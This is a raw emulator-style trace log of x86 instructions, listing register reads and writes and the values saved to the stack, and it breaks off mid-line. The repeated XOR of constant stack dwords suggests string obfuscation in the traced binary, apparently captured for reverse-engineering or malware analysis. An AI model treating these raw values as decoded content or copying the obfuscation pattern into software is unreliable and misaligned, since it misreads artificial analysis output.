ecx, esi, regs_read: [29], regs_write: [22] 0x45b44e: mov dword ptr [esp + 0x1b8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x81b8 for stack size 0x10000 saving data to stack: 929680980 4 0x45b459: mov dword ptr [esp + 0x1bc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x4c and offset 0x81bc for stack size 0x10000 saving data to stack: 1389027477 4 0x45b464: pxor xmm1, xmmword ptr [esp + 0x1b0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4c and offset 0x81b0 for stack size 0x10000 0x45b46d: push eax, regs_read: [30, 19], regs_write: [30] 0x45b477: movaps xmmword ptr [esp + 0x1b4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x50 and offset 0x81b4 for stack size 0x10000 saving data to stack: 135099320244714391247415712029416278692 16 0x45b48d: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45b492: mov dword ptr [esp + 0x1a0], 0x36eae0c2, regs_read: [30], regs_write: () adjusting stack for ESP -0x50 and offset 0x81a0 for stack size 0x10000 saving data to stack: 921362626 4 0x45b49d: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45b4a2: mov dword ptr [esp + 0x1a4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x50 and offset 0x81a4 for stack size 0x10000 saving data to stack: 896093928 4 0x45b4a9: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45b4ae: mov dword ptr [esp + 0x1a8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x50 and offset 0x81a8 for stack size 0x10000 saving data to stack: 929680980 4 0x45b4b5: mov dword ptr [esp + 0x1ac], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x50 and offset 0x81ac for stack size 0x10000 saving data to stack: 1389027477 4 0x45b4bc: movaps xmm1, xmmword ptr [esp + 0x1a0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x50 and offset 0x81a0 for stack size 0x10000 0x45b4c4: mov dword ptr [esp + 0x11c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x50 and offset 0x811c for stack size 0x10000 saving data to stack: 1389027477 4 0x45b4d2: mov dword ptr [esp + 0x118], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x50 and offset 0x8118 for stack size 0x10000 saving data to stack: 929680980 4 0x45b4d9: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45b4db: mov dword ptr [esp + 0x114], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x50 and offset 0x8114 for stack size 0x10000 saving data to stack: 896093928 4 0x45b4e2: mov dword ptr [esp + 0x110], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x50 and offset 0x8110 for stack size 0x10000 saving data to stack: 914789047 4 0x45b4ed: pxor xmm1, xmmword ptr [esp + 0x110], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x50 and offset 0x8110 for stack size 0x10000 0x45b4f6: push eax, regs_read: [30, 19], regs_write: [30] 0x45b4f7: movaps xmmword ptr [esp + 0x1a4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x54 and offset 0x81a4 for stack size 0x10000 saving data to stack: 7107189 16 0x45b50b: push ecx, regs_read: [30, 22], regs_write: [30] 0x45b50c: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45b513: push dword ptr [esp + 0x9c], regs_read: [30], regs_write: [30] 0x45b521: push dword ptr [esp + 0x9c], regs_read: [30], regs_write: [30] 0x45b52d: movaps xmm1, xmmword ptr [esp + 0x100], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x60 and offset 0x8100 for stack size 0x10000 0x45b53c: mov dword ptr [esp + 0x190], 0x53ebfbc3, regs_read: [30], regs_write: () adjusting stack for ESP -0x60 and offset 0x8190 for stack size 0x10000 saving data to stack: 1407974339 4 0x45b547: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45b549: mov dword ptr [esp + 0x194], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x60 and offset 0x8194 for stack size 0x10000 saving data to stack: 896093928 4 0x45b554: mov dword ptr [esp + 0x198], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x60 and offset 0x8198 for stack size 0x10000 saving data to stack: 929680980 4 0x45b55f: mov dword ptr [esp + 0x19c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x60 and offset 0x819c for stack size 0x10000 saving data to stack: 1389027477 4 0x45b56a: pxor xmm1, xmmword ptr [esp + 0x190], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x60 and offset 0x8190 for stack size 0x10000 0x45b573: push eax, regs_read: [30, 19], regs_write: [30] 0x45b574: movaps xmmword ptr [esp + 0x194], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x64 and offset 0x8194 for stack size 0x10000 saving data to stack: 110050094715989831055737464010821481879 16 0x45b58a: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45b58f: mov dword ptr [esp + 0x180], 0x53ebfbc3, regs_read: [30], regs_write: () adjusting stack for ESP -0x64 and offset 0x8180 for stack size 0x10000 saving data to stack: 1407974339 4 0x45b59a: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45b59f: mov dword ptr [esp + 0xf4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x64 and offset 0x80f4 for stack size 0x10000 saving data to stack: 896093928 4 0x45b5a6: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45b5ab: mov dword ptr [esp + 0xf8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x64 and offset 0x80f8 for stack size 0x10000 saving data to stack: 929680980 4 0x45b5b2: mov dword ptr [esp + 0x18c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x64 and offset 0x818c for stack size 0x10000 saving data to stack: 1389027477 4 0x45b5b9: mov dword ptr [esp + 0xfc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x64 and offset 0x80fc for stack size 0x10000 saving data to stack: 1389027477 4 0x45b5c7: mov dword ptr [esp + 0x188], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x64 and offset 0x8188 for stack size 0x10000 saving data to stack: 929680980 4 0x45b5ce: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45b5d0: mov dword ptr [esp + 0x184], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x64 and offset 0x8184 for stack size 0x10000 saving data to stack: 896093928 4 0x45b5d7: mov dword ptr [esp + 0xf0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x64 and offset 0x80f0 for stack size 0x10000 saving data to stack: 914789047 4 0x45b5e2: movaps xmm1, xmmword ptr [esp + 0xf0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x64 and offset 0x80f0 for stack size 0x10000 0x45b5ea: pxor xmm1, xmmword ptr [esp + 0x180], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x64 and offset 0x8180 for stack size 0x10000 0x45b5f3: push eax, regs_read: [30, 19], regs_write: [30] 0x45b5f4: movaps xmmword ptr [esp + 0x184], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x68 and offset 0x8184 for stack size 0x10000 saving data to stack: 1701669236 16 0x45b608: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45b60f: mov ecx, dword ptr [esp + 0x90], regs_read: [30], regs_write: [22] adjusting stack for ESP -0x68 and offset 0x8090 for stack size 0x10000 0x45b616: mov edx, dword ptr [esp + 0x94], regs_read: [30], regs_write: [24] adjusting stack for ESP -0x68 and offset 0x8094 for stack size 0x10000 0x45b61f: mov edx, dword ptr [esp + 0xa4], regs_read: [30], regs_write: [24] adjusting stack for ESP -0x68 and offset 0x80a4 for stack size 0x10000 0x45b626: mov ecx, dword ptr [esp + 0xa0], regs_read: [30], regs_write: [22] adjusting stack for ESP -0x68 and offset 0x80a0 for stack size 0x10000 0x45b63c: push edx, regs_read: [30, 24], regs_write: [30] 0x45b645: push ecx, regs_read: [30, 22], regs_write: [30] 0x45b646: push eax, regs_read: [30, 19], regs_write: [30] 0x45b647: mov dword ptr [esp + 0x17c], 0x138fe192, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x817c for stack size 0x10000 saving data to stack: 328196498 4 0x45b659: mov dword ptr [esp + 0x180], 0x381c2284, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x8180 for stack size 0x10000 saving data to stack: 941367940 4 0x45b664: mov dword ptr [esp + 0x184], 0x3769ce5e, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x8184 for stack size 0x10000 saving data to stack: 929680990 4 0x45b66f: mov dword ptr [esp + 0x188], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x8188 for stack size 0x10000 saving data to stack: 1389027477 4 0x45b67a: movaps xmm1, xmmword ptr [esp + 0xcc], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x74 and offset 0x80cc for stack size 0x10000 0x45b682: pxor xmm1, xmmword ptr [esp + 0x17c], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x74 and offset 0x817c for stack size 0x10000 0x45b68b: push eax, regs_read: [30, 19], regs_write: [30] 0x45b68c: push edi, regs_read: [30, 23], regs_write: [30] 0x45b68d: movaps xmmword ptr [esp + 0x184], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x7c and offset 0x8184 for stack size 0x10000 saving data to stack: 110050094701684154955373135822961684346 16 0x45b6bc: push eax, regs_read: [30, 19], regs_write: [30] 0x45b6d1: push edi, regs_read: [30, 23], regs_write: [30] 0x45b6d7: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45b6d8: mov edi, dword ptr [esp + 0x18], regs_read: [30], regs_write: [23] adjusting stack for ESP -0x80 and offset 0x8018 for stack size 0x10000 0x45b6dc: mov byte ptr [esp + 0x17], 1, regs_read: [30], regs_write: () adjusting stack for ESP -0x80 and offset 0x8017 for stack size 0x10000 saving data to stack: 1 1 0x45b6ea: mov eax, dword ptr [esp + 0x5c], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x80 and offset 0x805c for stack size 0x10000 0x45b714: push eax, regs_read: [30, 19], regs_write: [30] 0x45b732: mov eax, dword ptr [esp + 0x1c], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x84 and offset 0x801c for stack size 0x10000 0x45b740: mov esi, 0x52cae095, regs_read: (), regs_write: [29] 0x45b758: push ecx, regs_read: [30, 22], regs_write: [30] 0x45b765: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45b772: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x45b777: mov dword ptr [esp + 0x28], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x84 and offset 0x8028 for stack size 0x10000 saving data to stack: 929680980 4 0x45b782: mov dword ptr [esp + 0x20], 0x36c5d1eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x84 and offset 0x8020 for stack size 0x10000 saving data to stack: 918933995 4 0x45b78a: mov edx, 0x4f05f0, regs_read: (), regs_write: [24] 0x45b78f: mov dword ptr [esp + 0x24], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x84 and offset 0x8024 for stack size 0x10000 saving data to stack: 896093928 4 0x45b797: mov dword ptr [esp + 0x2c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x84 and offset 0x802c for stack size 0x10000 saving data to stack: 1389027477 4 0x45b79b: movaps xmm1, xmmword ptr [esp + 0x20], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x84 and offset 0x8020 for stack size 0x10000 0x45b7a0: mov dword ptr [esp + 0x68], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x84 and offset 0x8068 for stack size 0x10000 saving data to stack: 929680980 4 0x45b7a8: mov dword ptr [esp + 0x60], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x84 and offset 0x8060 for stack size 0x10000 saving data to stack: 914789047 4 0x45b7b0: mov dword ptr [esp + 0x64], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x84 and offset 0x8064 for stack size 0x10000 saving data to stack: 896093928 4 0x45b7b8: mov dword ptr [esp + 0x6c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x84 and offset 0x806c for stack size 0x10000 saving data to stack: 1389027477 4 0x45b7bc: pxor xmm1, xmmword ptr [esp + 0x60], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x84 and offset 0x8060 for stack size 0x10000 0x45b7c2: push eax, regs_read: [30, 19], regs_write: [30] 0x45b7c3: movaps xmmword ptr [esp + 0x24], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x88 and offset 0x8024 for stack size 0x10000 saving data to stack: 4408156 16 0x45b7dc: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45b7e5: push 0, regs_read: [30], regs_write: [30] 0x45b7e7: push eax, regs_read: [30, 19], regs_write: [30] 0x45b7f6: mov esi, 0x4f0608, regs_read: (), regs_write: [29] 0x45b7fb: mov byte ptr [esp + 0x17], 0, regs_read: [30], regs_write: () adjusting stack for ESP -0x8c and offset 0x8017 for stack size 0x10000 saving data to stack: 0 1 0x45b800: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45b822: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45b829: mov eax, dword ptr [esp + 0x98], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x8c and offset 0x8098 for stack size 0x10000 0x45b830: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x45b832: mov dword ptr [esp + 0x74], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x8c and offset 0x8074 for stack size 0x10000 saving data to stack: 0 4 0x45b83e: mov dword ptr [esp + 0xa8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x8c and offset 0x80a8 for stack size 0x10000 saving data to stack: 0 4 0x45b851: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45b867: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45b869: push eax, regs_read: [30, 19], regs_write: [30] 0x45b876: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45b878: push eax, regs_read: [30, 19], regs_write: [30] 0x45b896: mov esi, eax, regs_read: [19], regs_write: [29] 0x45b8a4: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45b8ab: mov eax, dword ptr [esp + 0x90], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x94 and offset 0x8090 for stack size 0x10000 0x45b8b2: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x45b8b4: mov dword ptr [esp + 0xa0], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x94 and offset 0x80a0 for stack size 0x10000 saving data to stack: 896093928 4 0x45b8c6: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45b8e2: mov dword ptr [esp + 0x410], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x94 and offset 0x8410 for stack size 0x10000 saving data to stack: 914789047 4 0x45b8ed: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45b8f2: mov dword ptr [esp + 0x18], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x94 and offset 0x8018 for stack size 0x10000 saving data to stack: 914789047 4 0x45b8f6: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45b8fb: mov dword ptr [esp + 0x418], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x94 and offset 0x8418 for stack size 0x10000 saving data to stack: 929680980 4 0x45b902: mov edi, 0x35694ee8, regs_read: (), regs_write: [23] 0x45b907: mov dword ptr [esp + 0x41c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x94 and offset 0x841c for stack size 0x10000 saving data to stack: 1389027477 4 0x45b90e: mov dword ptr [esp + 0x238], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x94 and offset 0x8238 for stack size 0x10000 saving data to stack: 929680980 4 0x45b91c: mov dword ptr [esp + 0x414], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x94 and offset 0x8414 for stack size 0x10000 saving data to stack: 896093928 4 0x45b923: movaps xmm1, xmmword ptr [esp + 0x410], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x94 and offset 0x8410 for stack size 0x10000 0x45b92b: mov dword ptr [esp + 0x230], 0x368692e8, regs_read: [30], regs_write: () adjusting stack for ESP -0x94 and offset 0x8230 for stack size 0x10000 saving data to stack: 914789096 4 0x45b936: mov dword ptr [esp + 0x234], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x94 and offset 0x8234 for stack size 0x10000 saving data to stack: 896093928 4 0x45b93d: mov dword ptr [esp + 0x23c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x94 and offset 0x823c for stack size 0x10000 saving data to stack: 1389027477 4 0x45b944: pxor xmm1, xmmword ptr [esp + 0x230], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x94 and offset 0x8230 for stack size 0x10000 0x45b94d: push edx, regs_read: [30, 24], regs_write: [30] 0x45b955: movaps xmmword ptr [esp + 0x234], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x98 and offset 0x8234 for stack size 0x10000 saving data to stack: 95 16 0x45b962: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45b96f: push 0x4dc5ad, regs_read: [30], regs_write: [30] 0x45b974: mov dword ptr [esp + 0x1c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x98 and offset 0x801c for stack size 0x10000 saving data to stack: 896093928 4 0x45b97d: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45b982: mov dword ptr [esp + 0x290], 0x3686f0c0, regs_read: [30], regs_write: () adjusting stack for ESP -0x98 and offset 0x8290 for stack size 0x10000 saving data to stack: 914813120 4 0x45b98d: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45b992: mov dword ptr [esp + 0x294], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x98 and offset 0x8294 for stack size 0x10000 saving data to stack: 896093928 4 0x45b999: mov edi, eax, regs_read: [19], regs_write: [23] 0x45b99b: mov dword ptr [esp + 0x298], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x98 and offset 0x8298 for stack size 0x10000 saving data to stack: 929680980 4 0x45b9a2: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45b9a7: mov dword ptr [esp + 0x424], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x98 and offset 0x8424 for stack size 0x10000 saving data to stack: 896093928 4 0x45b9ae: mov dword ptr [esp + 0x29c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x98 and offset 0x829c for stack size 0x10000 saving data to stack: 1389027477 4 0x45b9b5: movaps xmm1, xmmword ptr [esp + 0x290], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x98 and offset 0x8290 for stack size 0x10000 0x45b9bd: mov dword ptr [esp + 0x428], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x98 and offset 0x8428 for stack size 0x10000 saving data to stack: 929680980 4 0x45b9c4: mov dword ptr [esp + 0x42c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x98 and offset 0x842c for stack size 0x10000 saving data to stack: 1389027477 4 0x45b9cb: mov dword ptr [esp + 0x420], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x98 and offset 0x8420 for stack size 0x10000 saving data to stack: 914789047 4 0x45b9d6: pxor xmm1, xmmword ptr [esp + 0x420], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x98 and offset 0x8420 for stack size 0x10000 0x45b9df: movaps xmmword ptr [esp + 0x290], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x98 and offset 0x8290 for stack size 0x10000 saving data to stack: 25207 16 0x45b9e7: mov dword ptr [esp + 0x2a4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x98 and offset 0x82a4 for stack size 0x10000 saving data to stack: 896093928 4 0x45b9ee: mov dword ptr [esp + 0x2a8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x98 and offset 0x82a8 for stack size 0x10000 saving data to stack: 929680980 4 0x45b9f5: mov dword ptr [esp + 0x2ac], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x98 and offset 0x82ac for stack size 0x10000 saving data to stack: 1389027477 4 0x45b9fc: mov dword ptr [esp + 0x2a0], 0x42fee699, regs_read: [30], regs_write: () adjusting stack for ESP -0x98 and offset 0x82a0 for stack size 0x10000 saving data to stack: 1124001433 4 0x45ba07: movaps xmm1, xmmword ptr [esp + 0x2a0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x98 and offset 0x82a0 for stack size 0x10000 0x45ba0f: mov dword ptr [esp + 0x484], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x98 and offset 0x8484 for stack size 0x10000 saving data to stack: 896093928 4 0x45ba16: mov dword ptr [esp + 0x488], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x98 and offset 0x8488 for stack size 0x10000 saving data to stack: 929680980 4 0x45ba1d: mov dword ptr [esp + 0x48c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x98 and offset 0x848c for stack size 0x10000 saving data to stack: 1389027477 4 0x45ba24: mov dword ptr [esp + 0x480], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x98 and offset 0x8480 for stack size 0x10000 saving data to stack: 914789047 4 0x45ba2f: pxor xmm1, xmmword ptr [esp + 0x480], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x98 and offset 0x8480 for stack size 0x10000 0x45ba38: mov dword ptr [esp + 0x244], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x98 and offset 0x8244 for stack size 0x10000 saving data to stack: 896093928 4 0x45ba3f: mov dword ptr [esp + 0x248], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x98 and offset 0x8248 for stack size 0x10000 saving data to stack: 929680980 4 0x45ba46: mov dword ptr [esp + 0x24c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x98 and offset 0x824c for stack size 0x10000 saving data to stack: 1389027477 4 0x45ba4d: movaps xmmword ptr [esp + 0x2a0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x98 and offset 0x82a0 for stack size 0x10000 saving data to stack: 1954051118 16 0x45ba55: mov dword ptr [esp + 0x240], 0x368692eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x98 and offset 0x8240 for stack size 0x10000 saving data to stack: 914789099 4 0x45ba60: movaps xmm1, xmmword ptr [esp + 0x240], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x98 and offset 0x8240 for stack size 0x10000 0x45ba68: mov dword ptr [esp + 0x494], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x98 and offset 0x8494 for stack size 0x10000 saving data to stack: 896093928 4 0x45ba76: mov dword ptr [esp + 0x498], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x98 and offset 0x8498 for stack size 0x10000 saving data to stack: 929680980 4 0x45ba84: mov dword ptr [esp + 0x49c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x98 and offset 0x849c for stack size 0x10000 saving data to stack: 1389027477 4 0x45ba92: mov dword ptr [esp + 0x490], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x98 and offset 0x8490 for stack size 0x10000 saving data to stack: 914789047 4 0x45ba9d: pxor xmm1, xmmword ptr [esp + 0x490], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x98 and offset 0x8490 for stack size 0x10000 0x45baa6: push eax, regs_read: [30, 19], regs_write: [30] 0x45baa7: movaps xmmword ptr [esp + 0x244], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x9c and offset 0x8244 for stack size 0x10000 saving data to stack: 92 16 0x45bab4: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45bab5: push dword ptr [esp + 0xa8], regs_read: [30], regs_write: [30] 0x45babc: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45bac3: push eax, regs_read: [30, 19], regs_write: [30] 0x45bad0: push edi, regs_read: [30, 23], regs_write: [30] 0x45bad8: push eax, regs_read: [30, 19], regs_write: [30] 0x45bad9: push dword ptr [esp + 0x80], regs_read: [30], regs_write: [30] 0x45baf3: push eax, regs_read: [30, 19], regs_write: [30] 0x45bb00: push eax, regs_read: [30, 19], regs_write: [30] 0x45bb2b: push ecx, regs_read: [30, 22], regs_write: [30] 0x45bb2c: push eax, regs_read: [30, 19], regs_write: [30] 0x45bb32: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45bb33: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45bb34: mov edi, eax, regs_read: [19], regs_write: [23] 0x45bb3d: mov dword ptr [esp + 0x78], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xb4 and offset 0x8078 for stack size 0x10000 saving data to stack: 896093928 4 0x45bb6a: mov eax, dword ptr [esp + 0x18], regs_read: [30], regs_write: [19] adjusting stack for ESP -0xb4 and offset 0x8018 for stack size 0x10000 0x45bb7c: mov dword ptr [esp + 0x18], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xb4 and offset 0x8018 for stack size 0x10000 saving data to stack: 1668184403 4 0x45bb85: mov eax, dword ptr [esp + 0x18], regs_read: [30], regs_write: [19] adjusting stack for ESP -0xb4 and offset 0x8018 for stack size 0x10000 0x45bb97: mov dword ptr [esp + 0x18], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xb4 and offset 0x8018 for stack size 0x10000 saving data to stack: 1668184403 4 0x45bbaf: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45bbb1: push eax, regs_read: [30, 19], regs_write: [30] 0x45bbbe: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45bbc0: push eax, regs_read: [30, 19], regs_write: [30] 0x45bbcd: push eax, regs_read: [30, 19], regs_write: [30] 0x45bbe2: mov edx, 0x368692b7, regs_read: (), regs_write: [24] 0x45bbe7: mov dword ptr [esp + 0x500], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP -0xc0 and offset 0x8500 for stack size 0x10000 saving data to stack: 1913178889 4 0x45bbf2: mov ecx, 0x35694ee8, regs_read: (), regs_write: [22] 0x45bbf7: mov dword ptr [esp + 0x4a0], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xc0 and offset 0x84a0 for stack size 0x10000 saving data to stack: 914789047 4 0x45bbfe: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x45bc03: mov dword ptr [esp + 0x4a4], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc0 and offset 0x84a4 for stack size 0x10000 saving data to stack: 896093928 4 0x45bc0a: mov edi, 0x52cae095, regs_read: (), regs_write: [23] 0x45bc0f: mov dword ptr [esp + 0x4a8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc0 and offset 0x84a8 for stack size 0x10000 saving data to stack: 929680980 4 0x45bc16: mov esi, 0x84ff9d1e, regs_read: (), regs_write: [29] 0x45bc1b: mov dword ptr [esp + 0x4ac], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xc0 and offset 0x84ac for stack size 0x10000 saving data to stack: 1389027477 4 0x45bc22: mov dword ptr [esp + 0x4c0], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xc0 and offset 0x84c0 for stack size 0x10000 saving data to stack: 914789047 4 0x45bc29: mov dword ptr [esp + 0x4c4], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc0 and offset 0x84c4 for stack size 0x10000 saving data to stack: 896093928 4 0x45bc30: mov dword ptr [esp + 0x4c8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc0 and offset 0x84c8 for stack size 0x10000 saving data to stack: 929680980 4 0x45bc37: mov dword ptr [esp + 0x4cc], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xc0 and offset 0x84cc for stack size 0x10000 saving data to stack: 1389027477 4 0x45bc3e: mov dword ptr [esp + 0x4e0], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xc0 and offset 0x84e0 for stack size 0x10000 saving data to stack: 914789047 4 0x45bc45: mov dword ptr [esp + 0x4e4], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc0 and offset 0x84e4 for stack size 0x10000 saving data to stack: 896093928 4 0x45bc4c: mov dword ptr [esp + 0x4e8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc0 and offset 0x84e8 for stack size 0x10000 saving data to stack: 929680980 4 0x45bc53: mov dword ptr [esp + 0x4ec], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xc0 and offset 0x84ec for stack size 0x10000 saving data to stack: 1389027477 4 0x45bc5a: mov dword ptr [esp + 0x4f0], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xc0 and offset 0x84f0 for stack size 0x10000 saving data to stack: 914789047 4 0x45bc61: mov dword ptr [esp + 0x4f4], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc0 and offset 0x84f4 for stack size 0x10000 saving data to stack: 896093928 4 0x45bc68: mov dword ptr [esp + 0x4f8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc0 and offset 0x84f8 for stack size 0x10000 saving data to stack: 929680980 4 0x45bc6f: mov dword ptr [esp + 0x4fc], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xc0 and offset 0x84fc for stack size 0x10000 saving data to stack: 1389027477 4 0x45bc76: mov dword ptr 